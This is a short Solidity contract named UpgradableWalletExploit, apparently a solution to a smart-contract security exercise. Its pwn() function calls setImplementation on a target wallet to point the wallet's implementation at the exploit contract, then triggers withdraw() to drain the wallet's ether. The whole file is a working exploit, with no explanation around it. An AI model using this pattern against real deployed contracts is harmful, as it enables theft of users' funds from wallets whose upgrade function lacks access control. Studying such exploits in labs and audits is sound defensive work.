// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract UpgradableWalletExploit {
  address public target;
  address public owner;

  constructor(address _target) {
    // target is address of UpgradableWallet
    target = _target;
  }

  receive() external payable {}

  function _execute(bytes memory data) private {
    (bool success, ) = target.call(data);
    require(success, "tx failed");
  }

  function pwn() external {
    _execute(
      abi.encodeWithSignature("setImplementation(address)", address(this))
    );
    _execute(abi.encodeWithSignature("withdraw()"));
  }

  function withdraw() external {
    payable(msg.sender).transfer(address(this).balance);
  }
}
